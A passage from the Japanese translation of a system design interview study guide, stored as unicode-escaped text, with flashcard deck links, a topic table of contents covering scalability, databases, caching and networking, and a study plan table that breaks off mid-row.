**\u5fc5\u8981\u4e0d\u53ef\u6b20\u306a\u8981\u7d20** \u3067\u3059\u3002\n\n**\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u9762\u63a5\u3067\u306e\u983b\u51fa\u8cea\u554f\u306b\u5099\u3048**\u3001\u81ea\u5206\u306e\u89e3\u7b54\u3068*\u6a21\u7bc4\u89e3\u7b54*:\u30c7\u30a3\u30b9\u30ab\u30c3\u30b7\u30e7\u30f3\u3001\u30b3\u30fc\u30c9\u305d\u3057\u3066\u56f3\u8868\u306a\u3069\u3092*\u6bd4\u8f03*\u3057\u3066\u5b66\u3073\u307e\u3057\u3087\u3046\u3002\n\n\u9762\u63a5\u6e96\u5099\u306b\u5f79\u7acb\u3064\u305d\u306e\u4ed6\u306e\u30c8\u30d4\u30c3\u30af:\n\n* [\u5b66\u7fd2\u6307\u91dd](#\u5b66\u7fd2\u6307\u91dd)\n* [\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u9762\u63a5\u8ab2\u984c\u306b\u3069\u306e\u3088\u3046\u306b\u6e96\u5099\u3059\u308b\u304b](#\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u9762\u63a5\u306b\u3069\u306e\u3088\u3046\u306b\u3057\u3066\u81e8\u3081\u3070\u3044\u3044\u304b)\n* [\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u8ab2\u984c\u4f8b **\u3068\u305d\u306e\u89e3\u7b54**](#\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u8ab2\u984c\u4f8b\u3068\u305d\u306e\u89e3\u7b54)\n* [\u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u6307\u5411\u8a2d\u8a08\u8ab2\u984c\u4f8b\u3001 **\u3068\u305d\u306e\u89e3\u7b54**](#\u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u6307\u5411\u8a2d\u8a08\u554f\u984c\u3068\u89e3\u7b54)\n* [\u305d\u306e\u4ed6\u306e\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u9762\u63a5\u8ab2\u984c\u4f8b](#\u4ed6\u306e\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u9762\u63a5\u4f8b\u984c)\n\n## \u6697\u8a18\u30ab\u30fc\u30c9\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/zdCAkB3.png\"\/>\n  <br\/>\n<\/p>\n\n\u3053\u306e[Anki\u7528\u30d5\u30e9\u30c3\u30b7\u30e5\u30ab\u30fc\u30c9\u30c7\u30c3\u30ad](https:\/\/apps.ankiweb.net\/) \u306f\u3001\u9593\u9694\u53cd\u5fa9\u3092\u6d3b\u7528\u3057\u3066\u3001\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u306e\u30ad\u30fc\u30b3\u30f3\u30bb\u30d7\u30c8\u306e\u5b66\u7fd2\u3092\u652f\u63f4\u3057\u307e\u3059\u3002\n\n* [\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u30c7\u30c3\u30ad](resources\/flash_cards\/System%20Design.apkg)\n* [\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u7df4\u7fd2\u8ab2\u984c\u30c7\u30c3\u30ad](resources\/flash_cards\/System%20Design%20Exercises.apkg)\n* [\u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u6307\u5411\u7df4\u7fd2\u8ab2\u984c\u30c7\u30c3\u30ad](resources\/flash_cards\/OO%20Design.apkg)\n\n\u5916\u51fa\u5148\u3084\u79fb\u52d5\u4e2d\u306e\u52c9\u5f37\u306b\u5f79\u7acb\u3064\u3067\u3057\u3087\u3046\u3002\n\n### \u30b3\u30fc\u30c7\u30a3\u30f3\u30b0\u6280\u8853\u8ab2\u984c\u7528\u306e\u554f\u984c: \u7df4\u7fd2\u7528\u30a4\u30f3\u30bf\u30e9\u30af\u30c6\u30a3\u30d6\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\n\n\u30b3\u30fc\u30c9\u6280\u8853\u9762\u63a5\u7528\u306e\u554f\u984c\u3092\u63a2\u3057\u3066\u3044\u308b\u5834\u5408\u306f[**\u3053\u3061\u3089**](https:\/\/github.com\/donnemartin\/interactive-coding-challenges)\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/b4YtAEN.png\"\/>\n  <br\/>\n<\/p>\n\n\u59c9\u59b9\u30ea\u30dd\u30b8\u30c8\u30ea\u306e [**Interactive Coding Challenges**](https:\/\/github.com\/donnemartin\/interactive-coding-challenges)\u3082\u898b\u3066\u307f\u3066\u304f\u3060\u3055\u3044\u3002\u8ffd\u52a0\u306e\u6697\u8a18\u30c7\u30c3\u30ad\u30ab\u30fc\u30c9\u3082\u5165\u3063\u3066\u3044\u307e\u3059\u3002\n\n* [Coding deck](https:\/\/github.com\/donnemartin\/interactive-coding-challenges\/tree\/master\/anki_cards\/Coding.apkg)\n\n## \u30b3\u30f3\u30c8\u30ea\u30d3\u30e5\u30fc\u30c8\n\n> \u30b3\u30df\u30e5\u30cb\u30c6\u30a3\u304b\u3089\u5b66\u3076\n\n\u30d7\u30eb\u30ea\u30af\u30a8\u30b9\u30c8\u7b49\u306e\u8ca2\u732e\u306f\u7a4d\u6975\u7684\u306b\u304a\u9858\u3044\u3057\u307e\u3059:\n\n* \u30a8\u30e9\u30fc\u4fee\u6b63\n* \u30bb\u30af\u30b7\u30e7\u30f3\u5185\u5bb9\u6539\u5584\n* \u65b0\u898f\u30bb\u30af\u30b7\u30e7\u30f3\u8ffd\u52a0\n* [\u7ffb\u8a33\u3059\u308b](https:\/\/github.com\/donnemartin\/system-design-primer\/issues\/28)\n\n\u73fe\u5728\u3001\u5185\u5bb9\u306e\u6539\u5584\u304c\u5fc5\u8981\u306a\u4f5c\u696d\u4e2d\u306e\u30b3\u30f3\u30c6\u30f3\u30c4\u306f[\u3053\u3061\u3089](#\u9032\u884c\u4e2d\u306e\u4f5c\u696d)\u3067\u3059\u3002\n\n\u30b3\u30f3\u30c8\u30ea\u30d3\u30e5\u30fc\u30c8\u306e\u524d\u306b[Contributing Guidelines](CONTRIBUTING.md)\u3092\u8aad\u307f\u307e\u3057\u3087\u3046\u3002\n\n## \u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u76ee\u6b21\n\n> \u8cdb\u5426\u3082\u542b\u3081\u305f\u69d8\u3005\u306a\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u306e\u5404\u30c8\u30d4\u30c3\u30af\u306e\u6982\u8981\u3002 **\u5168\u3066\u306f\u30c8\u30ec\u30fc\u30c9\u30aa\u30d5\u306e\u95a2\u4fc2\u306b\u3042\u308a\u307e\u3059\u3002**\n>\n> \u305d\u308c\u305e\u308c\u306e\u30bb\u30af\u30b7\u30e7\u30f3\u306f\u3088\u308a\u5b66\u3073\u3092\u6df1\u3081\u308b\u3088\u3046\u306a\u4ed6\u306e\u6587\u732e\u3078\u306e\u30ea\u30f3\u30af\u304c\u8cbc\u3089\u308c\u3066\u3044\u307e\u3059\u3002\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/jrUBAF7.png\"\/>\n  <br\/>\n<\/p>\n\n* [\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u30c8\u30d4\u30c3\u30af: \u307e\u305a\u306f\u3053\u3053\u304b\u3089](#\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u30c8\u30d4\u30c3\u30af\u30b9-\u307e\u305a\u306f\u3053\u3053\u304b\u3089)\n    * [Step 1: \u30b9\u30b1\u30fc\u30e9\u30d3\u30ea\u30c6\u30a3\u306b\u95a2\u3059\u308b\u52d5\u753b\u3092\u898b\u308b](#\u30b9\u30c6\u30c3\u30d7-1-\u30b9\u30b1\u30fc\u30e9\u30d3\u30ea\u30c6\u30a3\u306b\u95a2\u3059\u308b\u52d5\u753b\u3092\u89b3\u3066\u5fa9\u7fd2\u3059\u308b)\n    * [Step 2: \u30b9\u30b1\u30fc\u30e9\u30d3\u30ea\u30c6\u30a3\u306b\u95a2\u3059\u308b\u8a18\u4e8b\u3092\u8aad\u3080](#\u30b9\u30c6\u30c3\u30d7-2-\u30b9\u30b1\u30fc\u30e9\u30d3\u30ea\u30c6\u30a3\u306b\u95a2\u3059\u308b\u8cc7\u6599\u3092\u8aad\u3093\u3067\u5fa9\u7fd2\u3059\u308b)\n    * [\u6b21\u306e\u30b9\u30c6\u30c3\u30d7](#\u6b21\u306e\u30b9\u30c6\u30c3\u30d7)\n* [\u30d1\u30d5\u30a9\u30fc\u30de\u30f3\u30b9 vs \u30b9\u30b1\u30fc\u30e9\u30d3\u30ea\u30c6\u30a3](#\u30d1\u30d5\u30a9\u30fc\u30de\u30f3\u30b9-vs-\u30b9\u30b1\u30fc\u30e9\u30d3\u30ea\u30c6\u30a3)\n* [\u30ec\u30a4\u30c6\u30f3\u30b7\u30fc vs \u30b9\u30eb\u30fc\u30d7\u30c3\u30c8](#\u30ec\u30a4\u30c6\u30f3\u30b7\u30fc-vs-\u30b9\u30eb\u30fc\u30d7\u30c3\u30c8)\n* [\u53ef\u7528\u6027 vs \u4e00\u8cab\u6027](#\u53ef\u7528\u6027-vs-\u4e00\u8cab\u6027)\n    * [CAP\u7406\u8ad6](#cap-\u7406\u8ad6)\n        * [CP - \u4e00\u8cab\u6027(consistency)\u3068\u5206\u5272\u6027(partition)\u8010\u6027](#cp---\u4e00\u8cab\u6027\u3068\u5206\u65ad\u8010\u6027consistency-and-partition-tolerance)\n        * [AP - \u53ef\u7528\u6027(availability)\u3068\u5206\u5272\u6027(partition)\u8010\u6027](#ap---\u53ef\u7528\u6027\u3068\u5206\u65ad\u8010\u6027availability-and-partition-tolerance)\n* [\u4e00\u8cab\u6027 \u30d1\u30bf\u30fc\u30f3](#\u4e00\u8cab\u6027\u30d1\u30bf\u30fc\u30f3)\n    * [\u5f31\u3044\u4e00\u8cab\u6027](#\u5f31\u3044\u4e00\u8cab\u6027)\n    * [\u7d50\u679c\u6574\u5408\u6027](#\u7d50\u679c\u6574\u5408\u6027)\n    * [\u5f37\u3044\u4e00\u8cab\u6027](#\u5f37\u3044\u4e00\u8cab\u6027)\n* [\u53ef\u7528\u6027 \u30d1\u30bf\u30fc\u30f3](#\u53ef\u7528\u6027\u30d1\u30bf\u30fc\u30f3)\n    * [\u30d5\u30a7\u30a4\u30eb\u30aa\u30fc\u30d0\u30fc](#\u30d5\u30a7\u30a4\u30eb\u30aa\u30fc\u30d0\u30fc)\n    * [\u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3](#\u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3)\n* [\u30c9\u30e1\u30a4\u30f3\u30cd\u30fc\u30e0\u30b7\u30b9\u30c6\u30e0(DNS)](#\u30c9\u30e1\u30a4\u30f3\u30cd\u30fc\u30e0\u30b7\u30b9\u30c6\u30e0)\n* [\u30b3\u30f3\u30c6\u30f3\u30c4\u30c7\u30ea\u30d0\u30ea\u30fc\u30cd\u30c3\u30c8\u30ef\u30fc\u30af(CDN)](#\u30b3\u30f3\u30c6\u30f3\u30c4\u30c7\u30ea\u30d0\u30ea\u30fc\u30cd\u30c3\u30c8\u30ef\u30fc\u30afcontent-delivery-network)\n    * [\u30d7\u30c3\u30b7\u30e5CDN](#\u30d7\u30c3\u30b7\u30e5cdn)\n    * [\u30d7\u30ebCDN](#\u30d7\u30ebcdn)\n* [\u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc](#\u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc)\n    * [\u30a2\u30af\u30c6\u30a3\u30d6\/\u30d1\u30c3\u30b7\u30d6\u69cb\u6210](#\u30a2\u30af\u30c6\u30a3\u30d6\u30d1\u30c3\u30b7\u30d6)\n    * [\u30a2\u30af\u30c6\u30a3\u30d6\/\u30a2\u30af\u30c6\u30a3\u30d6\u69cb\u6210](#\u30a2\u30af\u30c6\u30a3\u30d6\u30a2\u30af\u30c6\u30a3\u30d6)\n    * [Layer 4 \u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b7\u30f3\u30b0](#layer-4-\u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b7\u30f3\u30b0)\n    * [Layer 7 \u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b7\u30f3\u30b0](#layer-7-\u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b7\u30f3\u30b0)\n    * [\u6c34\u5e73\u30b9\u30b1\u30fc\u30ea\u30f3\u30b0](#\u6c34\u5e73\u30b9\u30b1\u30fc\u30ea\u30f3\u30b0)\n* [\u30ea\u30d0\u30fc\u30b9\u30d7\u30ed\u30ad\u30b7 (WEB\u30b5\u30fc\u30d0\u30fc)](#\u30ea\u30d0\u30fc\u30b9\u30d7\u30ed\u30ad\u30b7web\u30b5\u30fc\u30d0\u30fc)\n    * [\u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc vs \u30ea\u30d0\u30fc\u30b9\u30d7\u30ed\u30ad\u30b7](#\u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc-vs-\u30ea\u30d0\u30fc\u30b9\u30d7\u30ed\u30ad\u30b7)\n* [\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u30ec\u30a4\u30e4\u30fc](#\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u5c64)\n    * [\u30de\u30a4\u30af\u30ed\u30b5\u30fc\u30d3\u30b9](#\u30de\u30a4\u30af\u30ed\u30b5\u30fc\u30d3\u30b9)\n    * [\u30b5\u30fc\u30d3\u30b9\u30c7\u30a3\u30b9\u30ab\u30d0\u30ea\u30fc](#service-discovery)\n* [\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9](#\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9)\n    * [\u30ea\u30ec\u30fc\u30b7\u30e7\u30ca\u30eb\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u30de\u30cd\u30b8\u30e1\u30f3\u30c8\u30b7\u30b9\u30c6\u30e0 (RDBMS)](#\u30ea\u30ec\u30fc\u30b7\u30e7\u30ca\u30eb\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u30de\u30cd\u30b8\u30e1\u30f3\u30c8\u30b7\u30b9\u30c6\u30e0-rdbms)\n        * [\u30de\u30b9\u30bf\u30fc\/\u30b9\u30ec\u30fc\u30d6 \u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3](#\u30de\u30b9\u30bf\u30fc\u30b9\u30ec\u30fc\u30d6-\u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3)\n        * [\u30de\u30b9\u30bf\u30fc\/\u30de\u30b9\u30bf\u30fc \u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3](#\u30de\u30b9\u30bf\u30fc\u30de\u30b9\u30bf\u30fc-\u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3)\n        * [\u30d5\u30a7\u30c7\u30ec\u30fc\u30b7\u30e7\u30f3](#federation)\n        * [\u30b7\u30e3\u30fc\u30c7\u30a3\u30f3\u30b0](#\u30b7\u30e3\u30fc\u30c7\u30a3\u30f3\u30b0)\n        * [\u30c7\u30ce\u30fc\u30de\u30e9\u30a4\u30bc\u30fc\u30b7\u30e7\u30f3](#\u975e\u6b63\u898f\u5316)\n        * [SQL \u30c1\u30e5\u30fc\u30cb\u30f3\u30b0](#sql\u30c1\u30e5\u30fc\u30cb\u30f3\u30b0)\n    * [NoSQL](#nosql)\n        * [\u30ad\u30fc\/\u30d0\u30ea\u30e5\u30fc\u30b9\u30c8\u30a2](#\u30ad\u30fc\u30d0\u30ea\u30e5\u30fc\u30b9\u30c8\u30a2)\n        * [\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u30b9\u30c8\u30a2](#\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u30b9\u30c8\u30a2)\n        * [\u30ef\u30a4\u30c9\u30ab\u30e9\u30e0\u30b9\u30c8\u30a2](#\u30ef\u30a4\u30c9\u30ab\u30e9\u30e0\u30b9\u30c8\u30a2)\n        * [\u30b0\u30e9\u30d5 \u30c7\u30fc\u30bf\u30d9\u30fc\u30b9](#\u30b0\u30e9\u30d5\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9)\n    * [SQL or NoSQL](#sql\u304bnosql\u304b)\n* [\u30ad\u30e3\u30c3\u30b7\u30e5](#\u30ad\u30e3\u30c3\u30b7\u30e5)\n    * [\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0](#\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0)\n    * [CDN\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0](#cdn\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0)\n    * [Web\u30b5\u30fc\u30d0\u30fc\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0](#web\u30b5\u30fc\u30d0\u30fc\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0)\n    * [\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0](#\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0)\n    * [\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0](#\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0)\n    * [\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u30af\u30a8\u30ea\u30ec\u30d9\u30eb\u3067\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0\u3059\u308b](#\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u30af\u30a8\u30ea\u30ec\u30d9\u30eb\u3067\u306e\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0)\n    * [\u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u30ec\u30d9\u30eb\u3067\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0\u3059\u308b](#\u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u30ec\u30d9\u30eb\u3067\u306e\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0)\n    * [\u3044\u3064\u30ad\u30e3\u30c3\u30b7\u30e5\u3092\u66f4\u65b0\u3059\u308b\u306e\u304b](#\u3044\u3064\u30ad\u30e3\u30c3\u30b7\u30e5\u3092\u66f4\u65b0\u3059\u308b\u304b)\n        * [\u30ad\u30e3\u30c3\u30b7\u30e5\u30a2\u30b5\u30a4\u30c9](#\u30ad\u30e3\u30c3\u30b7\u30e5\u30a2\u30b5\u30a4\u30c9)\n        * [\u30e9\u30a4\u30c8\u30b9\u30eb\u30fc](#\u30e9\u30a4\u30c8\u30b9\u30eb\u30fc)\n        * [\u30e9\u30a4\u30c8\u30d3\u30cf\u30a4\u30f3\u30c9 (\u30e9\u30a4\u30c8\u30d0\u30c3\u30af)](#\u30e9\u30a4\u30c8\u30d3\u30cf\u30a4\u30f3\u30c9-\u30e9\u30a4\u30c8\u30d0\u30c3\u30af)\n        * [\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30a2\u30d8\u30c3\u30c9](#\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30a2\u30d8\u30c3\u30c9)\n* [\u975e\u540c\u671f\u51e6\u7406](#\u975e\u540c\u671f\u51e6\u7406)\n    * [\u30e1\u30c3\u30bb\u30fc\u30b8\u30ad\u30e5\u30fc](#\u30e1\u30c3\u30bb\u30fc\u30b8\u30ad\u30e5\u30fc)\n    * [\u30bf\u30b9\u30af\u30ad\u30e5\u30fc](#\u30bf\u30b9\u30af\u30ad\u30e5\u30fc)\n    * [\u30d0\u30c3\u30af\u30d7\u30ec\u30c3\u30b7\u30e3\u30fc](#\u30d0\u30c3\u30af\u30d7\u30ec\u30c3\u30b7\u30e3\u30fc)\n* [\u901a\u4fe1](#\u901a\u4fe1)\n    * [\u4f1d\u9001\u5236\u5fa1\u30d7\u30ed\u30c8\u30b3\u30eb (TCP)](#\u4f1d\u9001\u5236\u5fa1\u30d7\u30ed\u30c8\u30b3\u30eb-tcp)\n    * [\u30e6\u30fc\u30b6\u30c7\u30fc\u30bf\u30b0\u30e9\u30e0\u30d7\u30ed\u30c8\u30b3\u30eb (UDP)](#\u30e6\u30fc\u30b6\u30c7\u30fc\u30bf\u30b0\u30e9\u30e0\u30d7\u30ed\u30c8\u30b3\u30eb-udp)\n    * [\u9060\u9694\u624b\u7d9a\u547c\u51fa (RPC)](#\u9060\u9694\u624b\u7d9a\u547c\u51fa-rpc)\n    * [Representational state transfer (REST)](#representational-state-transfer-rest)\n* [\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3](#\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3)\n* [\u88dc\u907a](#\u88dc\u907a)\n    * [2\u306e\u4e57\u6570\u8868](#2\u306e\u4e57\u6570\u8868)\n    * [\u5168\u3066\u306e\u30d7\u30ed\u30b0\u30e9\u30de\u30fc\u304c\u77e5\u308b\u3079\u304d\u30ec\u30a4\u30c6\u30f3\u30b7\u30fc\u5024](#\u5168\u3066\u306e\u30d7\u30ed\u30b0\u30e9\u30de\u30fc\u304c\u77e5\u308b\u3079\u304d\u30ec\u30a4\u30c6\u30f3\u30b7\u30fc\u5024)\n    * [\u4ed6\u306e\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u9762\u63a5\u4f8b\u984c](#\u4ed6\u306e\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u9762\u63a5\u4f8b\u984c)\n    * [\u5b9f\u4e16\u754c\u3067\u306e\u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3](#\u5b9f\u4e16\u754c\u306e\u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3)\n    * [\u5404\u4f01\u696d\u306e\u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3](#\u5404\u4f01\u696d\u306e\u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3)\n    * [\u4f01\u696d\u306e\u30a8\u30f3\u30b8\u30cb\u30a2\u30d6\u30ed\u30b0](#\u4f01\u696d\u306e\u30a8\u30f3\u30b8\u30cb\u30a2\u30d6\u30ed\u30b0)\n* [\u4f5c\u696d\u4e2d](#\u9032\u884c\u4e2d\u306e\u4f5c\u696d)\n* [\u30af\u30ec\u30b8\u30c3\u30c8](#\u30af\u30ec\u30b8\u30c3\u30c8)\n* [\u9023\u7d61\u60c5\u5831](#contact-info)\n* [\u30e9\u30a4\u30bb\u30f3\u30b9](#license)\n\n## \u5b66\u7fd2\u6307\u91dd\n\n> \u5b66\u7fd2\u30b9\u30d1\u30f3\u306b\u5fdc\u3058\u3066\u307f\u308b\u3079\u304d\u30c8\u30d4\u30c3\u30af\u30b9 (short, medium, long)\n\n![Imgur](http:\/\/i.imgur.com\/OfVllex.png)\n\n**Q: \u9762\u63a5\u306e\u305f\u3081\u306b\u306f\u3001\u3053\u3053\u306b\u3042\u308b\u3082\u306e\u3059\u3079\u3066\u3092\u3084\u3089\u306a\u3044\u3068\u3044\u3051\u306a\u3044\u306e\u3067\u3057\u3087\u3046\u304b\uff1f**\n\n**A: \u3044\u3048\u3001\u3053\u3053\u306b\u3042\u308b\u3059\u3079\u3066\u3092\u3084\u308b\u5fc5\u8981\u306f\u3042\u308a\u307e\u305b\u3093\u3002**\n\n\u9762\u63a5\u3067\u4f55\u3092\u805e\u304b\u308c\u308b\u304b\u306f\u4ee5\u4e0b\u306e\u6761\u4ef6\u306b\u3088\u3063\u3066\u5909\u308f\u3063\u3066\u304d\u307e\u3059:\n\n* \u3069\u308c\u3060\u3051\u306e\u6280\u8853\u7d4c\u9a13\u304c\u3042\u308b\u304b\n* \u3042\u306a\u305f\u306e\u6280\u8853\u80cc\u666f\u304c\u4f55\u3067\u3042\u308b\u304b\n* \u3069\u306e\u30dd\u30b8\u30b7\u30e7\u30f3\u306e\u305f\u3081\u306b\u9762\u63a5\u3092\u53d7\u3051\u3066\u3044\u308b\u304b\n* \u3069\u306e\u4f01\u696d\u306e\u9762\u63a5\u3092\u53d7\u3051\u3066\u3044\u308b\u304b\n* \u904b\n\n\u3088\u308a\u7d4c\u9a13\u306e\u3042\u308b\u5019\u88dc\u8005\u306f\u4e00\u822c\u7684\u306b\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u306b\u3064\u3044\u3066\u3088\u308a\u6df1\u3044\u77e5\u8b58\u3092\u6709\u3057\u3066\u3044\u308b\u3053\u3068\u3092\u8981\u6c42\u3055\u308c\u308b\u3067\u3057\u3087\u3046\u3002\u30b7\u30b9\u30c6\u30e0\u30a2\u30fc\u30ad\u30c6\u30af\u30c8\u3084\u30c1\u30fc\u30e0\u30ea\u30fc\u30c0\u30fc\u306f\u5404\u30e1\u30f3\u30d0\u30fc\u306e\u6301\u3064\u3088\u3046\u306a\u77e5\u8b58\u3088\u308a\u306f\u6df1\u3044\u898b\u8b58\u3092\u6301\u3063\u3066\u3044\u308b\u3079\u304d\u3067\u3057\u3087\u3046\u3002\u4e00\u6d41\u30c6\u30c3\u30af\u4f01\u696d\u3067\u306f\u8907\u6570\u56de\u306e\u8a2d\u8a08\u9762\u63a5\u3092\u8ab2\u3055\u308c\u308b\u3053\u3068\u304c\u591a\u3044\u3067\u3059\u3002\n\n\u307e\u305a\u306f\u5e83\u304f\u59cb\u3081\u3066\u3001\u305d\u3053\u304b\u3089\u3044\u304f\u3064\u304b\u306e\u5206\u91ce\u306b\u7d5e\u3063\u3066\u6df1\u3081\u3066\u3044\u304f\u306e\u304c\u3044\u3044\u3067\u3057\u3087\u3046\u3002\u69d8\u3005\u306a\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u306e\u30c8\u30d4\u30c3\u30af\u306b\u3064\u3044\u3066\u5c11\u3057\u305a\u3064\u77e5\u3063\u3066\u304a\u304f\u3053\u3068\u306f\u3044\u3044\u3053\u3068\u3067\u3059\u3002\u4ee5\u4e0b\u306e\u5b66\u7fd2\u30ac\u30a4\u30c9\u3092\u81ea\u5206\u306e\u5b66\u7fd2\u306b\u5f53\u3066\u3089\u308c\u308b\u6642\u9593\u3001\u6280\u8853\u7d4c\u9a13\u3001\u3069\u306e\u8077\u4f4d\u3001\u3069\u306e\u4f1a\u793e\u306b\u5fdc\u52df\u3057\u3066\u3044\u308b\u304b\u306a\u3069\u3092\u52a0\u5473\u3057\u3066\u81ea\u5206\u7528\u306b\u8abf\u6574\u3057\u3066\u4f7f\u3046\u3068\u3044\u3044\u3067\u3057\u3087\u3046\u3002\n\n* **\u77ed\u671f\u9593** - **\u5e45\u5e83\u304f** \u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u30c8\u30d4\u30c3\u30af\u3092\u5b66\u3076\u3002**\u3044\u304f\u3064\u304b\u306e** \u9762\u63a5\u8ab2\u984c\u3092\u89e3\u304f\u3053\u3068\u3067\u5bfe\u7b56\u3059\u308b\u3002\n* **\u4e2d\u671f\u9593** - **\u5e45\u5e83\u304f** \u305d\u3057\u3066 **\u305d\u308c\u306a\u308a\u306b\u6df1\u304f**\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u30c8\u30d4\u30c3\u30af\u3092\u5b66\u3076\u3002**\u591a\u304f\u306e** \u9762\u63a5\u8ab2\u984c\u3092\u89e3\u304f\u3053\u3068\u3067\u5bfe\u7b56\u3059\u308b\u3002\n* **\u9577\u671f\u9593** - **\u5e45\u5e83\u304f** \u305d\u3057\u3066 **\u3082\u3063\u3068\u6df1\u304f**\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u30c8\u30d4\u30c3\u30af\u3092\u5b66\u3076\u3002**\u307b\u307c\u5168\u3066\u306e** \u9762\u63a5\u8ab2\u984c\u3092\u89e3\u304f\u3053\u3068\u3067\u5bfe\u7b56\u3059\u308b\u3002\n\n| | \u77ed\u671f\u9593 | \u4e2d\u671f\u9593 | \u9577\u671f\u9593 |\n|---|---|---|---|\n| [\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u30c8\u30d4\u30c3\u30af](#\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u76ee\u6b21) \u3092\u8aad\u307f\u3001\u30b7\u30b9\u30c6\u30e0\u52d5\u4f5c\u6a5f\u5e8f\u306b\u3064\u3044\u3066\u5e83\u304f\u77e5\u308b | :+1: | :+1: | :+1: |\n| \u6b21\u306e\u30ea\u30f3\u30af\u5148\u306e\u3044\u304f\u3064\u304b\u306e\u30da\u30fc\u30b8\u3092\u8aad\u3093\u3067 [\u5404\u4f01\u696d\u306e\u30a8\u30f3\u30b8\u30cb\u30a2\u30ea\u30f3\u30b0\u30d6\u30ed\u30b0](#\u4f01\u696d\u306e\u30a8\u30f3\u30b8\u30cb\u30a2\u30d6\u30ed\u30b0) \u5fdc\u52df\u3059\u308b\u4f1a\u793e\u306b\u3064\u3044\u3066\u77e5\u308b | :+1: | :+1: | :+1: |\n| \u6b21\u306e\u30ea\u30f3\u30af\u5148\u306e\u3044\u304f\u3064\u304b\u306e\u30da\u30fc\u30b8\u3092\u8aad\u3080 